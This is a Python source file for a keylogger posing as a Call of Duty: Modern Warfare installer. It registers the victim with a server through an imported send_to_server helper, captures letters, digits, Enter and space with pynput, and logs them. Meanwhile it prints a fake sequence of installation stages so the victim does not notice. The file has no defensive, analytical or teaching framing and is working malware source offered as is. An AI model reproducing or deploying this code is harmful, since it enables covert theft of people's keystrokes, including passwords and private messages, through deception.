from utils.utils import create_id, print_log, send_to_server
from pynput import keyboard
import time
import sys

def setup():
    create_id()
    send_to_server()

def listen_keyboard():
    def on_press(key):
        try:
            if hasattr(key, 'char') and key.char is not None:
                if key.char.isalnum():
                    print_log(key.char)
            elif key == keyboard.Key.enter:
                print_log("[ENTER]\n")
            elif key == keyboard.Key.space:
                print_log(" ")

        except Exception as e:
            print(f"Error logging key: {e}")

    with keyboard.Listener(on_press=on_press) as listener:
        display_installation_message()
        listener.join()

def display_installation_message():
    stages = [
        "Initializing Call of Duty: Modern Warfare Installation...",
        "Verifying system integrity and preparing the installation environment...",
        "Checking for necessary updates...",
        "Validating system files...",
        "Connecting to Activision servers...",
        "Downloading Core Files...",
        "Installing game assets...",
        "Configuring multiplayer files...",
        "Applying patches and hotfixes...",
        "Finalizing installation...",
        "Installation Complete. Ready to Deploy."
    ]

    for stage in stages:
        sys.stdout.write(f"\r{stage}")
        sys.stdout.flush()
        time.sleep(2)
        print() 

    print("\nPress [Enter] to continue.")

if __name__ == '__main__':
    setup()
    try:
        listen_keyboard()
    except KeyboardInterrupt:
        print("Keyboard listener stopped.")
    except Exception as e:
        print(f"An error occurred: {e}")
